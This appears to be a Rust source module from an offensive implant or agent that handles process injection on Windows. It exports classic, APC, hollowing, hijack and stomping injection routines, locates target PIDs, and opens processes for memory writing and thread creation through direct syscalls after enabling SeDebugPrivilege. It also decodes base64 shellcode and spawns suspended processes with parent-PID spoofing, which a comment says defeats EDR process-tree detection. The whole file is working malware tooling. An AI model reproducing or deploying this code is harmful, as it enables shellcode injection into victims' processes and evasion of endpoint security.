#![allow(unused)]

#[cfg(target_os = "windows")]
pub mod classic;
#[cfg(target_os = "windows")]
pub mod apc;
#[cfg(target_os = "windows")]
pub mod hollow;
#[cfg(target_os = "windows")]
pub mod hijack;
#[cfg(target_os = "windows")]
pub mod stomp;

#[cfg(target_os = "windows")]
pub use classic::inject_classic;
#[cfg(target_os = "windows")]
pub use apc::inject_apc;
#[cfg(target_os = "windows")]
pub use apc::inject_classic_spawn;
#[cfg(target_os = "windows")]
pub use hollow::inject_hollow;
#[cfg(target_os = "windows")]
pub use hollow::hollow_into_process;
#[cfg(target_os = "windows")]
pub use hijack::inject_hijack;
#[cfg(target_os = "windows")]
pub use stomp::inject_stomp;
#[cfg(all(target_os = "windows", feature = "inject-stomp"))]
pub use stomp::inject_stomp_remote;

pub type InjectResult = Result<(), String>;

#[cfg(target_os = "windows")]
pub fn pid_by_name(name: &str) -> Option<u32> {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    use windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE;
    use windows_sys::Win32::Foundation::CloseHandle;

    let name_lower: Vec<u16> = name.encode_utf16().map(|c| {
        if c >= b'A' as u16 && c <= b'Z' as u16 { c + 32 } else { c }
    }).collect();

    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return None;
        }
        let mut entry: PROCESSENTRY32W = core::mem::zeroed();
        entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut entry) == 0 {
            CloseHandle(snap);
            return None;
        }
        loop {
            let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
            let exe: Vec<u16> = entry.szExeFile[..len].iter().map(|&c| {
                if c >= b'A' as u16 && c <= b'Z' as u16 { c + 32 } else { c }
            }).collect();
            if exe == name_lower {
                let pid = entry.th32ProcessID;
                CloseHandle(snap);
                return Some(pid);
            }
            entry = core::mem::zeroed();
            entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
            if Process32NextW(snap, &mut entry) == 0 {
                break;
            }
        }
        CloseHandle(snap);
    }
    None
}

#[cfg(target_os = "windows")]
pub fn open_process_rw(pid: u32) -> Result<isize, i32> {
    use crate::syscall::{nt_open_process, ClientId};
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    const PROCESS_VM_READ: u32 = 0x0010;
    const PROCESS_VM_WRITE: u32 = 0x0020;
    const PROCESS_VM_OPERATION: u32 = 0x0008;
    const PROCESS_CREATE_THREAD: u32 = 0x0002;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    const ACCESS: u32 = PROCESS_VM_READ
        | PROCESS_VM_WRITE
        | PROCESS_VM_OPERATION
        | PROCESS_CREATE_THREAD
        | PROCESS_QUERY_INFORMATION;

    // Enable SeDebugPrivilege (privilege index 20) via RtlAdjustPrivilege — single ntdll
    // call, avoids needing advapi32 imports. Args: (Privilege, Enable, Client, WasEnabled).
    unsafe {
        let ntdll = b"ntdll.dll\0";
        let hmod = GetModuleHandleA(ntdll.as_ptr());
        if hmod != 0 {
            let fn_name = b"RtlAdjustPrivilege\0";
            if let Some(func) = GetProcAddress(hmod, fn_name.as_ptr()) {
                type RtlAdjPrivFn = unsafe extern "system" fn(u32, u8, u8, *mut u8) -> i32;
                let f: RtlAdjPrivFn = core::mem::transmute(func);
                let mut was_enabled: u8 = 0;
                f(20, 1, 0, &mut was_enabled);
            }
        }
    }

    // NtOpenProcess requires a non-NULL ObjectAttributes; the kernel probes the pointer
    // before ObCallbacks fire, so NULL → STATUS_ACCESS_VIOLATION (0xc0000005).
    // A zero-initialized struct with only Length set is the minimal valid form.
    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        _pad: u32,
        root_directory: usize,
        object_name: usize,
        attributes: u32,
        _pad2: u32,
        security_descriptor: usize,
        security_qos: usize,
    }
    let mut oa = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        _pad: 0, root_directory: 0, object_name: 0,
        attributes: 0, _pad2: 0, security_descriptor: 0, security_qos: 0,
    };

    let mut handle: isize = 0;
    let mut cid = ClientId { process: pid as isize, thread: 0 };
    let status = unsafe {
        nt_open_process(
            &mut handle,
            ACCESS,
            &mut oa as *mut ObjectAttributes as *mut u8,
            &mut cid,
        )
    };
    if status < 0 || handle == 0 {
        Err(if status < 0 { status } else { -1i32 })
    } else {
        Ok(handle)
    }
}

#[cfg(target_os = "windows")]
pub fn shellcode_from_b64(b64: &str) -> Option<Vec<u8>> {
    use base64::Engine as _;
    base64::engine::general_purpose::STANDARD.decode(b64).ok()
}

/// Spawn a suspended process with a spoofed parent PID.
/// Returns (hProcess, hThread) on success.
///
/// Parent PID spoofing passes an existing process handle via
/// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS so the child appears as a child of `ppid`
/// in the process tree rather than of the agent. This defeats tree-based EDR detections.
#[cfg(all(target_os = "windows", feature = "ppid-spoof"))]
pub fn spawn_suspended_spoofed(exe: &str, ppid: u32) -> Option<(isize, isize)> {
    use windows_sys::Win32::{
        Foundation::{CloseHandle, FALSE, INVALID_HANDLE_VALUE},
        System::Threading::{
            CreateProcessW, InitializeProcThreadAttributeList, OpenProcess,
            UpdateProcThreadAttribute, EXTENDED_STARTUPINFO_PRESENT,
            PROCESS_INFORMATION, STARTUPINFOEXW, CREATE_SUSPENDED,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        },
    };

    // PROCESS_CREATE_PROCESS (0x0080) — allows using the handle as a parent.
    const PROCESS_CREATE_PROCESS: u32 = 0x0080;

    let parent = unsafe {
        OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid)
    };
    if parent == 0 || parent == INVALID_HANDLE_VALUE {
        return None;
    }

    // Determine required attribute-list size for one attribute.
    // The first call returns ERROR_INSUFFICIENT_BUFFER but fills attr_size.
    let mut attr_size: usize = 0;
    unsafe { InitializeProcThreadAttributeList(core::ptr::null_mut(), 1, 0, &mut attr_size) };
    if attr_size == 0 {
        unsafe { CloseHandle(parent) };
        return None;
    }
    let mut attr_buf = vec![0u8; attr_size];
    let attr_list = attr_buf.as_mut_ptr() as *mut _;
    if unsafe { InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size) } == 0 {
        unsafe { CloseHandle(parent) };
        return None;
    }

    // Store the parent handle value so UpdateProcThreadAttribute can reference it.
    let mut parent_val: isize = parent as isize;
    if unsafe {
        UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            &mut parent_val as *mut isize as *mut core::ffi::c_void,
            core::mem::size_of::<isize>(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        )
    } == 0 {
        unsafe { CloseHandle(parent) };
        return None;
    }

    let mut si: STARTUPINFOEXW = unsafe { core::mem::zeroed() };
    si.StartupInfo.cb = core::mem::size_of::<STARTUPINFOEXW>() as u32;
    si.lpAttributeList = attr_list;

    let exe_wide: Vec<u16> = exe.encode_utf16().chain(core::iter::once(0)).collect();
    // lpCommandLine must be mutable; pass exe path as argv[0].
    let mut cmd: Vec<u16> = exe_wide.clone();

    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
    let ok = unsafe {
        CreateProcessW(
            exe_wide.as_ptr(),
            cmd.as_mut_ptr(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            FALSE,
            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            &mut si.StartupInfo,
            &mut pi,
        )
    };

    unsafe { CloseHandle(parent) };

    if ok == 0 {
        None
    } else {
        Some((pi.hProcess as isize, pi.hThread as isize))
    }
}

/// Spawn a suspended process without PPID spoofing (fallback / non-Windows builds).
#[cfg(target_os = "windows")]
pub fn spawn_suspended(exe: &str) -> Option<(isize, isize)> {
    use windows_sys::Win32::{
        Foundation::{CloseHandle, FALSE},
        System::Threading::{
            CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED,
        },
    };
    use std::ffi::CString;

    let exe_c = CString::new(exe).ok()?;
    let mut si: STARTUPINFOA = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let ok = unsafe {
        CreateProcessA(
            exe_c.as_ptr() as *const u8,
            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
            FALSE, CREATE_SUSPENDED, core::ptr::null_mut(), core::ptr::null_mut(),
            &mut si, &mut pi,
        )
    };
    if ok == 0 {
        None
    } else {
        Some((pi.hProcess as isize, pi.hThread as isize))
    }
}
